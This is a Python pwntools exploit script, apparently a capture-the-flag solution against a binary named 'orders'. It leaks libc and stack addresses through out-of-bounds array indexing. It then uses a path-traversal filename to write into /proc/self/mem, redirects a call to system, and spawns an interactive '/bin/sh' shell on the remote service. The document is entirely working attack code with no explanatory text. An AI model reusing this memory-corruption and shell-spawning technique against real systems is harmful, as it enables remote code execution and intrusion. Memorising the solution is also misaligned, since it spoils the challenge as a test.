#!/usr/bin/env python3
import sys
from pwn import *

context.terminal = ['tmux','splitw','-h','-p','77']

def cmd(c):
    io.sendlineafter(b'> ', str(c).encode())

def send(c):
    io.sendlineafter(b': ', str(c).encode())

def add(idx: int) -> str:
    cmd(1); send(1); send(idx)
    io.recvuntil(b'is: ')
    id = io.recvline().strip().decode()
    return id

def get(id: str):
    cmd(2); send(id)

def edit(filename: bytes, where: int, what: int):
    cmd(3); io.sendlineafter(b': ', filename)
    send(where); send(what)

if args.LOCAL:
    context.binary = exe = ELF('./orders')
    io = process([exe.path], env={'LD_PRELOAD':'./libc.so.6', 'TOKEN': 'task_token'})
else:
    io = remote(sys.argv[1], 13002)


items_addr = 0x404020

io.sendlineafter(b'token: ', 'task_token')

id = add((0x403F80-items_addr)//0x10)
get(id)
io.recvuntil('0. ')
libc = unpack(io.recv(6), 'all') - 0x114a20
log.success('libc: ' + hex(libc))

id = add((libc+0x221200-items_addr)//0x10)
get(id)
io.recvuntil('0. ')
stack = unpack(io.recv(6), 'all')
log.success('stack: ' + hex(stack))

system_addr = stack-0x200

edit(
    filename=b'../../../proc/self/mem\0\0'+p64(libc+0x50d60),
    where=(0x403F80)//0x10,
    what=(system_addr - items_addr)//0x10,
)

cmd(2)
io.sendafter(b': ', b'/bin/sh\0')

io.interactive()
